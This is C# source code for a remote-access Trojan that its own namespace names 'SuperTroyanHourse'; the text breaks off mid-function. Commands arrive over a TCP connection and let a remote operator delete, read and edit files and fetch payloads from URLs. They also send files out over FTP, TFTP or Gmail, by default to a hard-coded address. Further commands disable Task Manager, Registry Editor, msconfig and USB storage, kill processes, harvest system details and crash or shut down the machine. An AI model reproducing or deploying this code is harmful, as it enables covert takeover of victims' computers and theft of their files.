using System;
using System.Diagnostics;
using IO = System.IO;
using Mail = System.Net.Mail;
using Net = System.Net;

namespace SuperTroyanHourse
{
    internal static class commander
    {
        private static string CurrentFolder = "C:\\";

        public static string reactonCommand(string text)
        {
            string baseCommand = text.Split(' ')[0];
            string argsCommand = (text.Split(' ').Length > 1 ? text.Substring(baseCommand.Length + 1) : string.Empty);
            Console.WriteLine(text);
            switch (baseCommand)
            {
                case PowerControl.COMMAND_SHUTDOWN:
                    return PowerControl.Shutdown(argsCommand);
                case PowerControl.COMMAND_RESTART:
                    return PowerControl.Restart(argsCommand);
                case PowerControl.COMMAND_LOG_OFF:
                    return PowerControl.LogOff(argsCommand);

                case FileManegar.COPY_COMMAND:
                    return FileManegar.Copy(argsCommand);
                case FileManegar.MOVE_COMMAND:
                    return FileManegar.Move(argsCommand);
                case FileManegar.DELETE_COMMAND:
                    return FileManegar.Delete(argsCommand);
                case FileManegar.CHANGE_DIR_COMMAND:
                    return FileManegar.ChangeDir(argsCommand);
                case FileManegar.SHOW_CURRENT_FOLDER_COMMAND:
                    return CurrentFolder;
                case FileManegar.SHOW_CONTENT_COMMAND:
                    return FileManegar.ShowContent(argsCommand);
                case FileManegar.CREATE_COMMAND:
                    return FileManegar.Create(argsCommand);
                case FileManegar.GET_FILE_COMMAND:
                    return FileManegar.GetFile(argsCommand);
                case FileManegar.EDIT_FILE_COMMAND:
                    return FileManegar.EditFile(argsCommand);

                case Internet.HELP_INTERNET_COMMAND:
                    return Internet.Help();
                case Internet.HTTP_DOWNLOAD_COMMAND:
                    return Internet.HTTP_Download(argsCommand);
                case Internet.FTP_DOWNLOAD_COMMAND:
                    return Internet.FTP_DOWNLOAD(argsCommand);
                case Internet.FTP_UPLOAD_COMMAND:
                    return Internet.FTP_UPLOAD(argsCommand);
                case Internet.TFTP_DOWNLOAD_COMMAND:
                    return Internet.TFTP_DOWNLOAD(argsCommand);
                case Internet.TFTP_COMMAND:
                    return Internet.TFTP(argsCommand);
                case Internet.TFTP_UPLOAD_COMMAND:
                    return Internet.TFTP_UPLOAD(argsCommand);
                case Internet.SEND_GMAIL_COMMAND:
                    return Internet.SEND_GMAIL(argsCommand);

                case TaskManager.TASK_ENEBALE_COMMAND:
                    return TaskManager.TaskEnable(argsCommand);
                case TaskManager.USB_ENEBALE_COMMAND:
                    return TaskManager.UsbEnable(argsCommand);
                case TaskManager.PROCESS_COMMAND:
                    return TaskManager.ProcessControl(argsCommand);
                case TaskManager.TASK_INFO_COMMAND:
                    return TaskManager.GetTaskInfo(argsCommand);
                case TaskManager.SET_DESKTOP_IMAGE_COMMAND:
                    return TaskManager.SetDesktopImage(argsCommand);

                case CRASH_COMMAND:
                    return CrashOS();
                case CALL_COMMAND:
                    return CallFromUser(argsCommand.Split(' ')[0], (argsCommand.Split(' ').Length > 1 ? argsCommand.Substring(argsCommand.Split(' ')[0].Length + 1) : ""));
                default:
                    if (IO.Directory.Exists(Program.FilesFolder)
                        && IO.Directory.GetFiles(Program.FilesFolder, baseCommand + ".*").Length > 0)
                        return CallFile(baseCommand, argsCommand, FileLocation.Default);
                    else if (IO.Directory.Exists(CurrentFolder)
                        && IO.Directory.GetFiles(CurrentFolder, baseCommand + ".*").Length > 0)
                        return CallFile(baseCommand, argsCommand, FileLocation.SameLocation);
                    break;
            }
            return "not good command";
        }

        private static class PowerControl
        {
            public const string COMMAND_SHUTDOWN = "shutdown";
            public const string COMMAND_RESTART = "restart";
            public const string COMMAND_LOG_OFF = "log_off";

            public static string Shutdown(string args)
            {
                try
                {
                    Process.Start("shutdown", "-s -f -t 0" + args);
                    return "ok";
                }
                catch
                {
                    return "there was a fail";
                }
            }

            public static string Restart(string args)
            {
                try
                {
                    Process.Start("shutdown", "-r -f -t 0 " + args);
                    return "ok";
                }
                catch
                {
                    return "there was a fail";
                }
            }

            public static string LogOff(string args)
            {
                try
                {
                    Process.Start("shutdown", "-l -f -t 0 " + args);
                    return "ok";
                }
                catch
                {
                    return "there was a fail";
                }
            }
        }

        private static class FileManegar
        {
            public const string COPY_COMMAND = "copy";
            public const string MOVE_COMMAND = "move";
            public const string DELETE_COMMAND = "del";
            public const string CHANGE_DIR_COMMAND = "cd";
            public const string SHOW_CONTENT_COMMAND = "dir";
            public const string SHOW_CURRENT_FOLDER_COMMAND = "show_dir";
            public const string CREATE_COMMAND = "create";
            public const string GET_FILE_COMMAND = "get";
            public const string EDIT_FILE_COMMAND = "edit";

            public static string Copy(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                try
                {
                    if (Array.IndexOf<string>(args, "-h") != -1)
                        return "copy -src [source] -dst [destination];\nIf you want folder add -d";
                    else if (args.Length < 0x4)
                        throw new ArgumentException();
                    string source = ConvertPath(args[Array.IndexOf<string>(args, "-src") + 1]),
                        destination = ConvertPath(args[Array.IndexOf<string>(args, "-dst") + 1]);

                    if (Array.IndexOf<string>(args, "-d") != -1)
                    {
                        if (!IO.Directory.Exists(source + '\\')) return "source folder not found; " + source;
                        return "copied " + other.DirectoryCopy(source + '\\', destination + '\\', true) + " files and folders\n" +
                            "from " + source + " to " + destination;
                    }
                    if (!IO.File.Exists(source)) return "source file not found";
                    IO.File.Copy(source, destination);
                    return "copied\n from " + source + " to " + destination;
                }
                catch (Exception ex)
                {
                    return "not copied\n" + ex.ToString();
                }
            }

            public static string ChangeDir(string args)
            {
                string temp = CurrentFolder;
                try
                {
                    if (args[0] == '\\') // for example \temp => return to root of drive
                        CurrentFolder = CurrentFolder.Substring(0, 2) + args;
                    else if (args == "..\\" || args == "../") // return one folder back
                    {
                        CurrentFolder = CurrentFolder.Substring(0, CurrentFolder.LastIndexOf('\\'));
                        CurrentFolder = CurrentFolder.Substring(0, CurrentFolder.LastIndexOf('\\')).Substring(0, CurrentFolder.LastIndexOf('\\'));
                        CurrentFolder += '\\';
                    }
                    else if (args.Length > 1 && args[1] == ':') // if the text starts in a drive ([letter]:)
                        CurrentFolder = (args[0] + @":\").ToUpper() + (args.Length > 3 ? args.Substring(3) : "");
                    else // if just move into a folder inside the current
                        CurrentFolder = ConvertPath(args.Replace('/', '\\') + (args[args.Length - 1] != '\\' ? "\\" : ""));
                    if (IO.Directory.Exists(CurrentFolder))
                    {
                        CurrentFolder = CurrentFolder.Replace('/', '\\');
                        CurrentFolder += (CurrentFolder[CurrentFolder.Length - 1] != '\\' ? "\\" : "");
                        return CurrentFolder;
                    }
                    Console.WriteLine(CurrentFolder);
                    CurrentFolder = temp;
                    throw new IO.DirectoryNotFoundException();
                }
                catch (Exception ex)
                {
                    return "didn't change directory\n" + ex.ToString();
                }
            }

            public static string Delete(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                try
                {
                    if (Array.IndexOf<string>(args, "-h") != -1)
                    {
                        return "del [-f|-d] [file|folder];\n" +
                               "deletes the folders ([d]) or files ([f]) that propers the pattern";
                    }
                    if (Array.IndexOf<string>(args, "-f") != -1)
                    {
                        string[] files = IO.Directory.GetFiles(CurrentFolder, args[Array.IndexOf<string>(args, "-f") + 1]);
                        if (files.Length == 0)
                            throw new IO.FileNotFoundException();
                        foreach (string file in files)
                            IO.File.Delete(file);
                        return "deleted " + files.Length + " files";
                    }
                    else if (Array.IndexOf<string>(args, "-d") != -1)
                    {
                        string[] files = IO.Directory.GetDirectories(CurrentFolder, args[Array.IndexOf<string>(args, "-d") + 1]);
                        if (files.Length == 0)
                            throw new IO.DirectoryNotFoundException();
                        foreach (string file in files)
                            IO.Directory.Delete(file);
                        return "deleted " + files.Length + " directories";
                    }
                    throw new ArgumentException();
                }
                catch (Exception ex)
                {
                    return "unable to delete\n" + ex.ToString();
                }
            }

            public static string Move(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                try
                {
                    if (Array.IndexOf<string>(args, "-h") != -1)
                        return "move -src [source] -dst [destination];\nIf you want folder add -d";
                    else if (args.Length < 4)
                        throw new ArgumentException();
                    string source = ConvertPath(args[Array.IndexOf<string>(args, "-src") + 1]),
                        destination = ConvertPath(args[Array.IndexOf<string>(args, "-dst") + 1]);

                    if (Array.IndexOf<string>(args, "-d") != -1)
                    {
                        if (!IO.Directory.Exists(source + '\\')) return "source folder not found; " + source;
                        return "moved " + other.DirectoryMove(source + '\\', destination + '\\', true) + " files and folders\n" +
                            "from " + source + " to " + destination;
                    }
                    if (!IO.File.Exists(source)) return "source file not found";

                    IO.File.Copy(source, destination);

                    return "moved\n from " + source + " to " + destination;
                }
                catch (Exception ex)
                {
                    return "not moved\n" + ex.ToString();
                }
            }

            public static string ShowContent(string args)
            {
                string result = string.Empty;
                try
                {
                    string[] temp = IO.Directory.GetFiles(CurrentFolder, args != "" ? args : "*");
                    if (temp.Length > 0)
                    {
                        result += "files:\n";
                        for (int i = 0; i < temp.Length; i++)
                            result += "~\\" + IO.Path.GetFileName(temp[i]) + (i % 3 == 0 || temp[i].Length > 20 ? "\n" : new string(' ', (23 - temp[i].Length)));
                    }
                    temp = IO.Directory.GetDirectories(CurrentFolder);
                    if (temp.Length > 0)
                    {
                        result += "\nfolders:\n";
                        for (int i = 0; i < temp.Length; i++)
                            result += "~\\" + IO.Path.GetFileName(temp[i]) + (i % 3 == 0 || temp[i].Length > 20 ? "\n" : new string(' ', (18 - temp[i].Length)));
                    }
                    if (result == string.Empty)
                    {
                        if (CurrentFolder.Length < 4 && CurrentFolder[1] == ':' && CurrentFolder.IndexOf('\\') == CurrentFolder.LastIndexOf('\\'))
                            return "the program can't get the content's of the base drive";
                        return "empty folder";
                    }
                    return result;
                }
                catch (ArgumentOutOfRangeException)
                {
                    return result + "\nthe program can't get all other content's of the base drive";
                }
            }

            public static string Create(string args)
            {
                try
                {
                    if (args == "-h")
                    {
                        return "create [f|d] [name];\n" +
                               "creates the folder ([d]) or file ([f]) with the name";
                    }
                    char type = args[0];
                    args = args.Substring(2, args.Length - 2);
                    if (type == 'f')
                    {
                        if (IO.File.Exists(CurrentFolder + args))
                            return "file already exists";
                        IO.File.Create(CurrentFolder + args).Close();
                        return "file created, " + CurrentFolder + args;
                    }
                    else if (type == 'd')
                    {
                        if (IO.Directory.Exists(CurrentFolder + args))
                            return "directory already exists";
                        IO.Directory.CreateDirectory(CurrentFolder + args);
                        return "directory created, " + CurrentFolder + args;
                    }
                    throw new ArgumentException();
                }
                catch (Exception ex)
                {
                    return "unable to delete\n" + ex.ToString();
                }
            }

            public static string GetFile(string args)
            {
                try
                {
                    if (args == "-h")
                        return "get [file] - will return the file content";

                    if (args[0] == '\\')
                        args = CurrentFolder.Substring(0, 2) + args.Substring(1);
                    else if (args[0] != ':')
                        args = CurrentFolder + args;

                    return IO.File.ReadAllText(args, System.Text.Encoding.ASCII);
                }
                catch (Exception ex)
                {
                    return "error\n" + ex.ToString();
                }
            }

            public static string EditFile(string arg)
            {
                if (arg.Contains("-h") || arg.Contains("-?"))
                    return EDIT_FILE_COMMAND + " ([-a]) -f [file_name] ([-g]);\n" +
                        "when -a means to append to the current;\n" +
                        "-g means to get the current content";
                string ExitText = "" + (char)0x3;
                string[] args = Program.argsConvertor(arg);
                IO.FileStream fs = null;
                IO.StreamWriter sw;
                {
                    string file = args[Array.IndexOf<string>(args, "-f") + 0x1];
                    if (file[0] == '\\')
                        file = CurrentFolder.Substring(0, 2) + file.Substring(1);
                    else if (file.Length < 2 || file[1] != ':')
                        file = CurrentFolder + file;

                    if (!IO.File.Exists(file))
                        IO.File.Create(file).Close();
                    if (arg.Contains("-g"))
                        TCPServer.Send(IO.File.ReadAllBytes(file));
                    if (arg.Contains("-a"))
                    {
                        fs = new IO.FileStream(file, IO.FileMode.Append, IO.FileAccess.Write);
                    }
                    else
                    {
                        fs = new IO.FileStream(file, IO.FileMode.Open, IO.FileAccess.Write);
                    }
                    sw = new IO.StreamWriter(fs);
                }
                TCPServer.Send("the file " + '#' + " is ready for editing\nTo Exit type " + ExitText + "\nAfter every enter it will add \\n to the text\n");
                string input = TCPServer.ReciveString();
                while (input != ExitText)
                {
                    TCPServer.Send("got " + input.Length + " chars");
                    sw.WriteLine(input);
                    input = TCPServer.ReciveString();
                }
                sw.Close();
                fs.Close();
                return "\n\n" + new string('=', 10) + "the file was editted!\nWe suggest to check the result with \"get\" command;";
            }
        }

        private static class Internet
        {
            public const string HTTP_DOWNLOAD_COMMAND = "http_download";
            public const string FTP_DOWNLOAD_COMMAND = "ftp_download";
            public const string FTP_UPLOAD_COMMAND = "ftp_upload";
            public const string TFTP_COMMAND = "tftp";
            public const string TFTP_DOWNLOAD_COMMAND = "tftp_download";
            public const string TFTP_UPLOAD_COMMAND = "tftp_upload";
            public const string SEND_GMAIL_COMMAND = "send_gmail";

            public const string HELP_INTERNET_COMMAND = "internet";

            public static string HTTP_Download(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                if (args.Length < 4) return "not enough arguments";

                string url = args[Array.IndexOf<string>(args, "-u") + 1];
                string destination = args[Array.IndexOf<string>(args, "-d") + 1];
                if (destination[0] == '\\')
                    destination = CurrentFolder.Substring(0, 2) + destination.Substring(1);
                else if (destination[1] != ':')
                    destination = CurrentFolder + destination;
                try
                {
                    using (System.Net.WebClient Client = new System.Net.WebClient())
                    {
                        Client.DownloadFile(url, destination);
                    }
                    return "downloaded to " + destination;
                }
                catch (Exception ex)
                {
                    return "error\n" + ex.GetType();
                }
            }

            public static string FTP_DOWNLOAD(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                if (Array.IndexOf<string>(args, "-h") != -1)
                    return "ftp_download -url [ip/domain] -dir [folder path] -file [file name] -user [userame] -pass [password] -dst [destination path];\n" +
                        "while the file name and folder doesn't start or end with /;";
                if (args.Length < 12)
                    return "not enough arguments";
                try
                {
                    string inputfilepath = args[Array.IndexOf<string>(args, "-dst") + 0x1];
                    if (inputfilepath[0] == '\\')
                        inputfilepath = CurrentFolder.Substring(0, 2) + inputfilepath.Substring(1);
                    else if (inputfilepath[1] != ':')
                        inputfilepath = CurrentFolder + inputfilepath;
                    string ftpHost = args[Array.IndexOf<string>(args, "-url") + 0x1];
                    string ftpDir = args[Array.IndexOf<string>(args, "-dir") + 0x1];
                    string ftpFile = args[Array.IndexOf<string>(args, "-file") + 0x1];

                    string username = args[Array.IndexOf<string>(args, "-user") + 0x1];
                    string password = args[Array.IndexOf<string>(args, "-pass") + 0x1];

                    string ftpfullpath = "ftp://" + ftpHost + '/' + (ftpDir != "/" ? ftpDir + '/' : string.Empty) + ftpFile;

                    System.Net.WebClient request = new System.Net.WebClient();
                    request.Credentials = new System.Net.NetworkCredential(username, password);
                    byte[] fileData = request.DownloadData(ftpfullpath);

                    IO.FileStream file = IO.File.Create(inputfilepath);
                    file.Write(fileData, 0, fileData.Length);
                    file.Close();
                    return "downloaded file " + ftpfullpath + "\n" +
                        "downloaded to " + inputfilepath + "\n" +
                        "size(Bytes) = " + fileData.Length;
                }
                catch (Exception ex)
                {
                    return "error:\n" + ex.ToString();
                }
            }

            public static string FTP_UPLOAD(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                if (Array.IndexOf<string>(args, "-h") != -1)
                    return "ftp_upload -url [ip/domain] -dir [folder path] -file [file name] -user [userame] -pass [password] -src [source path];\n" +
                        "while the file name and folder doesn't start or end with /;";
                if (args.Length < 12)
                    return "not enough arguments";
                try
                {
                    string inputfilepath = args[Array.IndexOf<string>(args, "-src") + 0x1];
                    if (inputfilepath[0] == '\\')
                        inputfilepath = CurrentFolder.Substring(0, 2) + inputfilepath.Substring(1);
                    else if (inputfilepath[1] != ':')
                        inputfilepath = CurrentFolder + inputfilepath;
                    string ftpHost = args[Array.IndexOf<string>(args, "-url") + 0x1];
                    string ftpDir = args[Array.IndexOf<string>(args, "-dir") + 0x1];
                    string ftpFile = args[Array.IndexOf<string>(args, "-file") + 0x1];

                    string username = args[Array.IndexOf<string>(args, "-user") + 0x1];
                    string password = args[Array.IndexOf<string>(args, "-pass") + 0x1];

                    string ftpfullpath = "ftp://" + ftpHost + '/' + (ftpDir != "/" ? ftpDir + '/' : string.Empty) + ftpFile;

                    Net.FtpWebRequest request = (Net.FtpWebRequest)Net.WebRequest.Create(ftpfullpath);
                    request.Method = Net.WebRequestMethods.Ftp.UploadFile;

                    request.Credentials = new Net.NetworkCredential(username, password);

                    IO.StreamReader sourceStream = new IO.StreamReader(inputfilepath);
                    byte[] fileContents = System.Text.Encoding.UTF8.GetBytes(sourceStream.ReadToEnd());
                    sourceStream.Close();
                    request.ContentLength = fileContents.Length;

                    IO.Stream requestStream = request.GetRequestStream();
                    requestStream.Write(fileContents, 0, fileContents.Length);
                    requestStream.Close();

                    Net.FtpWebResponse response = (Net.FtpWebResponse)request.GetResponse();
                    //string res = response.StatusDescription;

                    response.Close();
                    return "downloaded file " + ftpfullpath + "\n" +
                        "downloaded to " + inputfilepath + "\n" +
                        "size(Bytes) = " + fileContents.Length;
                }
                catch (Exception ex)
                {
                    return "error:\n" + ex.ToString();
                }
            }

            public static string TFTP(string arg)
            {
                if (arg.Contains("-h"))
                    return TFTP_COMMAND + " [-d|-u] -ip [ip] ([-p]) -dir [folder path] -file [file name] -dst [destination path];\n" +
                        "while the file name and folder doesn't start or end with /;\n" +
                        "if the -p isn't given, will use port 69;";
                if (arg.Contains("-d"))
                    return TFTP_DOWNLOAD(arg);
                if (arg.Contains("-u"))
                    return TFTP_UPLOAD(arg);
                return "bad chose";
            }

            public static string TFTP_DOWNLOAD(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                if (Array.IndexOf<string>(args, "-h") != -1)
                    return TFTP_DOWNLOAD_COMMAND + " -ip [ip] ([-p]) -dir [folder path] -file [file name] -dst [destination path];\n" +
                        "while the file name and folder doesn't start or end with /;\n" +
                        "if the -p isn't given, will use port 69;";
                if (args.Length < 6)
                    return "not enough arguments";
                try
                {
                    TFTPClient client;
                    if (Array.IndexOf<string>(args, "-p") == -1)
                        client = new TFTPClient(args[Array.IndexOf<string>(args, "-ip") + 1]);
                    else
                        client = new TFTPClient(args[Array.IndexOf<string>(args, "-ip") + 1], int.Parse(args[Array.IndexOf<string>(args, "-p") + 1]));

                    string inputfilepath = args[Array.IndexOf<string>(args, "-dst") + 0x1];
                    if (inputfilepath[0] == '\\')
                        inputfilepath = CurrentFolder.Substring(0, 2) + inputfilepath.Substring(1);
                    else if (inputfilepath[1] != ':')
                        inputfilepath = CurrentFolder + inputfilepath;

                    string Dir = args[Array.IndexOf<string>(args, "-dir") + 0x1];
                    string File = args[Array.IndexOf<string>(args, "-file") + 0x1];
                    client.Get((Dir != "\\" ? "\\" + Dir + "\\" : string.Empty) + File, inputfilepath);
                    return "downloaded file " + ('\\' + Dir + '\\' + File) + "\n" +
                        "downloaded to " + inputfilepath;
                }
                catch (Exception ex)
                {
                    return "error:\n" + ex.ToString();
                }
            }

            public static string TFTP_UPLOAD(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                if (Array.IndexOf<string>(args, "-h") != -1)
                    return TFTP_DOWNLOAD_COMMAND + " -ip [ip] ([-p]) -dir [folder path] -file [file name] -dst [destination path];\n" +
                        "while the file name and folder doesn't start or end with /;\n" +
                        "if the -p isn't given, will use port 69;";
                if (args.Length < 6)
                    return "not enough arguments";
                try
                {
                    TFTPClient client;
                    if (Array.IndexOf<string>(args, "-p") == -1)
                        client = new TFTPClient(args[Array.IndexOf<string>(args, "-ip") + 1]);
                    else
                        client = new TFTPClient(args[Array.IndexOf<string>(args, "-ip") + 1], int.Parse(args[Array.IndexOf<string>(args, "-p") + 1]));

                    string inputfilepath = args[Array.IndexOf<string>(args, "-dst") + 0x1];
                    if (inputfilepath[0] == '\\')
                        inputfilepath = CurrentFolder.Substring(0, 2) + inputfilepath.Substring(1);
                    else if (inputfilepath[1] != ':')
                        inputfilepath = CurrentFolder + inputfilepath;

                    string Dir = args[Array.IndexOf<string>(args, "-dir") + 0x1];
                    string File = args[Array.IndexOf<string>(args, "-file") + 0x1];

                    client.Put((Dir != "\\" ? "\\" + Dir + "\\" : string.Empty) + File, inputfilepath);
                    return "uploaded file " + inputfilepath + "\nto \\" + Dir + "\\" + File;
                }
                catch (Exception ex)
                {
                    return "error:\n" + ex.ToString();
                }
            }

            public static string SEND_GMAIL(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                const string defaultTo = "arthurzam@gmail.com";
                const string defaultSubject = "Super Trojan Hourse";
                if (Array.IndexOf<string>(args, "-h") != -1)
                    return "send_gmail -src [file path] (-file_name [file name]) -user [username] -pass [password] (-subject [subject]) (-body [body text]) (-to [to address]);\n" +
                        "where are brackets it is not must, defaults will be taken\n" + "username without \"@gmail.com\"\n";
                try
                {
                    string source = args[Array.IndexOf<string>(args, "-src") + 0x1];
                    string file_name = (Array.IndexOf<string>(args, "-file_name") == -1 ? IO.Path.GetFileName(source) : args[Array.IndexOf<string>(args, "-file_name") + 0x1]);
                    string username = args[Array.IndexOf<string>(args, "-user") + 0x1];
                    string password = args[Array.IndexOf<string>(args, "-pass") + 0x1];
                    string subject = (Array.IndexOf<string>(args, "-subject") == -1 ? defaultSubject : args[Array.IndexOf<string>(args, "-subject") + 0x1]);
                    string body = (Array.IndexOf<string>(args, "-body") == -1 ? string.Empty : args[Array.IndexOf<string>(args, "-body") + 0x1]);
                    string to = (Array.IndexOf<string>(args, "-to") == -1 ? defaultTo : args[Array.IndexOf<string>(args, "-to") + 0x1]);

                    Mail.MailMessage mail = new Mail.MailMessage();
                    Mail.SmtpClient SmtpServer = new Mail.SmtpClient("smtp.gmail.com");
                    mail.From = new Mail.MailAddress(username + "@gmail.com", username);
                    mail.To.Add(to);
                    mail.Subject = subject;
                    mail.Body = body;

                    System.Net.Mail.Attachment attachment = new System.Net.Mail.Attachment(source);
                    attachment.Name = file_name;
                    mail.Attachments.Add(attachment);

                    SmtpServer.Port = 587;
                    SmtpServer.Credentials = new System.Net.NetworkCredential(username, password);
                    SmtpServer.EnableSsl = true;

                    SmtpServer.Send(mail);
                    attachment.Dispose();
                    mail.Dispose();
                    return "sended to " + to + "\nfile path " + source;
                }
                catch (Exception ex)
                {
                    return "error:\n" + ex.ToString();
                }
            }

            public static string Help()
            {
                return HTTP_DOWNLOAD_COMMAND + "\n"
                    + FTP_DOWNLOAD_COMMAND + "\n" + FTP_UPLOAD_COMMAND + "\n"
                    + TFTP_DOWNLOAD_COMMAND + "\n" + TFTP_UPLOAD_COMMAND + "\n"
                    + SEND_GMAIL_COMMAND;
            }
        }

        private static class TaskManager
        {
            public const string PROCESS_COMMAND = "process";
            public const string TASK_INFO_COMMAND = "info";
            public const string TASK_ENEBALE_COMMAND = "task_enable";
            public const string USB_ENEBALE_COMMAND = "usb_enable";
            public const string SET_DESKTOP_IMAGE_COMMAND = "desktop_set";

            public static string TaskEnable(string arg)
            {
                System.Text.ASCIIEncoding enc = new System.Text.ASCIIEncoding();
                TCPServer.Send("every where enter 0 for eneble and 1 for disable\nTaskManager (state - " +
                    (other.TaskManeger.StopTaskManager ? "disabled" : "enebled") + " ):", enc);
                char task = TCPServer.ReciveString(2)[0];
                TCPServer.Send("Registry Editor (state - " +
                    (other.TaskManeger.StopRegEdit ? "disabled" : "enebled") + " ):", enc);
                char reg = TCPServer.ReciveString(2)[0];
                TCPServer.Send("msconfig (state - " +
                    (other.TaskManeger.StopMSCon ? "disabled" : "enebled") + " ):", enc);
                char msCon = TCPServer.ReciveString(2)[0];

                other.TaskManeger.StopTaskManager = (task != '0');
                other.TaskManeger.StopRegEdit = (reg != '0');
                other.TaskManeger.StopMSCon = (msCon != '0');
                return "OK";
            }

            public static string UsbEnable(string arg)
            {
                System.Text.ASCIIEncoding enc = new System.Text.ASCIIEncoding();
                TCPServer.Send("enter 0 for eneble and 1 for disable of usb ports:", enc);
                char task = TCPServer.ReciveString(2)[0];

                if (task == '1') // disable
                {
                    try
                    {
                        Microsoft.Win32.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR", "Start", 4, Microsoft.Win32.RegistryValueKind.DWord);
                        return "USB ports disabled";
                    }
                    catch (UnauthorizedAccessException)
                    {
                        return "doesn't have admin rights";
                    }
                }
                else
                {
                    try
                    {
                        Microsoft.Win32.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR", "Start", 3, Microsoft.Win32.RegistryValueKind.DWord);
                        return "USB ports enebled";
                    }
                    catch (UnauthorizedAccessException)
                    {
                        return "doesn't have admin rights";
                    }
                }
            }

            public static string ProcessControl(string arg)
            {
                string[] args = Program.argsConvertor(arg);
                try
                {
                    if (Array.IndexOf<string>(args, "-h") != -1)
                        return "process -g        = get all process" + "\n" +
                               "process -k [name] = kill all process with that name";
                    if (Array.IndexOf<string>(args, "-g") != -1)
                    {
                        Process[] all = Process.GetProcesses();
                        string text = "";
                        for (int i = 0; i < all.Length; i++)
                        {
                            text += all[i].ProcessName + new string(' ', Math.Max(0, 35 - all[i].ProcessName.Length)) +
                                all[i].MachineName + new string(' ', Math.Max(0, 10 - all[i].ProcessName.Length)) + "\n";
                        }
                        return text;
                    }
                    if (Array.IndexOf<string>(args, "-k") != -1)
                    {
                        Process[] all = Process.GetProcessesByName(args[Array.IndexOf<string>(args, "-k") + 0x1]);
                        foreach (Process p in all)
                        {
                            p.Kill();
                        }
                        return "killed " + all.Length + " processes";
                    }
                    return "";
                }
                catch (Exception ex)
                {
                    return ex.ToString();
                }
            }

            public static string GetTaskInfo(string arg)
            {
                const string CPU = "cpu";
                const string RAM = "ram";
                const string MAX_MAC = "mac";
                const string ALL_MAC = "mac_all";
                const string HARD_DISKS = "hard_memory";
                const string OS = "os";

                string[] args = Program.argsConvertor(arg);
                string result = string.Empty;

                #region help

                if (arg.Contains("-h") || arg.Contains("-?"))
                    return TASK_INFO_COMMAND + " " + CPU + " " + RAM + " " + MAX_MAC + " " + ALL_MAC + " " + HARD_DISKS + " " + OS + ";\n" +
                        "when " + MAX_MAC + " returns the current used network card with max speed\n" +
                        "when " + ALL_MAC + " returns all mac addresses;";

                #endregion help

                #region all

                if (arg == "*")
                    args = new string[] { CPU, RAM, MAX_MAC, ALL_MAC, HARD_DISKS, OS };

                #endregion all

                #region cpu

                if (Array.IndexOf<string>(args, CPU) != -1)
                {
                    PerformanceCounter cpuCounter = new PerformanceCounter();
                    cpuCounter.CategoryName = "Processor";
                    cpuCounter.CounterName = "% Processor Time";
                    cpuCounter.InstanceName = "_Total";
                    cpuCounter.NextValue();
                    System.Threading.Thread.Sleep(1000);
                    result += "CPU: " + Program.Floor(0x2, cpuCounter.NextValue()) + " %\n";
                }

                #endregion cpu

                #region ram

                if (Array.IndexOf<string>(args, RAM) != -1)
                {
                    Int64 phav = other.PerformanceInfo.GetPhysicalAvailableMemoryInMiB();
                    Int64 tot = other.PerformanceInfo.GetTotalMemoryInMiB();
                    double percentFree = Program.Floor(0x1, ((double)phav / (double)tot) * 0x64);
                    double percentOccupied = 100 - percentFree;
                    result += "Available RAM " + phav.ToString() + " MB\n";
                    result += "Total RAM " + tot.ToString() + " MB\n";
                    result += "Free RAM " + percentFree.ToString() + " %\n";
                    result += "Occupied RAM " + percentOccupied.ToString() + " %\n";

                    /*PerformanceCounter ramCounter = new PerformanceCounter("Memory", "Available MBytes");
                    result += "Aviable RAM: " + ramCounter.NextValue() + "MB" + '\n';*/
                }

                #endregion ram

                #region mac with max speed

                if (Array.IndexOf<string>(args, MAX_MAC) != -1)
                    result += "MAC Address: " + SuperTroyanHourse.Internet.GetMacAddress() + '\n';

                #endregion mac with max speed

                #region all macs

                if (Array.IndexOf<string>(args, ALL_MAC) != -1)
                    result += "MAC Addresses:\n" + string.Join("\n", SuperTroyanHourse.Internet.GetAllMacAddresses()) + '\n';

                #endregion all macs

                #region detailes of hard disks

                if (Array.IndexOf<string>(args, HARD_DISKS) != -1)
                {
                    result += "phisical memory on hard disks:\n";
                    result += " name  " + " label        " + "Size    " + "Free    " + "Used  " + '\n';
                    foreach (IO.DriveInfo drive in IO.DriveInfo.GetDrives())
                    {
                        if (drive.IsReady)
                        {
                            result += " " + drive.Name +
                                "    " + drive.VolumeLabel.PadRight(15, ' ') +
                                " " + Program.Floor(0x3, drive.TotalSize / 1073741824.0) + " GB" +
                                " " + Program.Floor(0x3, drive.TotalFreeSpace / 1073741824.0) + "GB" +
                                " " + Program.Floor(0x2, (drive.TotalSize - drive.TotalFreeSpace) / (double)drive.TotalSize) + "\n";
                        }
                    }
                }

                #endregion detailes of hard disks

                #region OS

                if (Array.IndexOf<string>(args, OS) != -1)
                {
                    OperatingSystem os = Environment.OSVersion;
                    result += "OS Name: " + other.OSInfo.Name + '\n';
                    result += "OS Edition: " + other.OSInfo.Edition + '\n';
                    result += "OS Version: " + os.Version.ToString() + '\n';
                    result += "OS Platform: " + os.Platform.ToString() + '\n';
                    result += "OS Service Pack: " + other.OSInfo.ServicePack + '\n';
                    result += "OS Version String: " + os.VersionString.ToString() + '\n';
                    result += "OS Type: " + (IntPtr.Size * 8) + " bit\n";
                    {
                        Microsoft.Win32.RegistryKey RKey = Microsoft.Win32.Registry.LocalMachine;
                        RKey = RKey.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
                        result += "Processor: " + ((string)RKey.GetValue("ProcessorNameString"));
                    }
                }

                #endregion OS

                return result;
            }

            public static string SetDesktopImage(string arg)
            {
                if (arg.Contains("-h"))
                    return SET_DESKTOP_IMAGE_COMMAND + " -u [image url] (-t [type])\nor\n" +
                           SET_DESKTOP_IMAGE_COMMAND + " -f [image path] (-t [type])\n" +
                           "  the default type is 2 (streched)\n" +
                           "  types: 0 - Tiled; 1 - Centered";

                string[] args = Program.argsConvertor(arg);
                string file_path = string.Empty;
                other.DesktopBackgroundChange.Style type;

                if (arg.Contains("-u"))
